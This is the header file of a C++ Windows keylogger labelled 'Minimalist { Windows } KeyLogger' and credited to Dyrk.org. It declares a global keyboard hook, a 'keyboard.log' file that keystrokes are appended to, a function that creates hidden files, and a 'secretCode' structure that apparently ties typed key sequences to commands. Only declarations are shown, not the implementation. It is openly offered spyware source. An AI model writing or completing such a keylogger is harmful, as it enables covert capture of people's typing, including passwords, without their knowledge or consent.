/*
*
*
*   Minimalist { Windows } KeyLogger
*   (c) Dyrk.org 2019 - 2020
*
*
*/

/*
*
*   Header File
*
*
*
**/
#include <Windows.h>
#include <stdio.h>
#include <sys/stat.h>
#include <ctype.h>
#include <vector>
#include <string>

#define _CRT_SECURE_NO_DEPRECATE
#define _KEYLOG_FILENAME_ "keyboard.log"
bool debug=false;

bool appendFile(char *filename, char letter);
bool logFileExist(char *filename);
bool writeFileString(char *filename, const char *str);
void createFile(char *filename, bool hidden);
void detectCurrentCode();
HHOOK keyboardHook;
using namespace std;

struct secretCode{
    string keyCode;
    string cmd;
};

string bufferString = "";

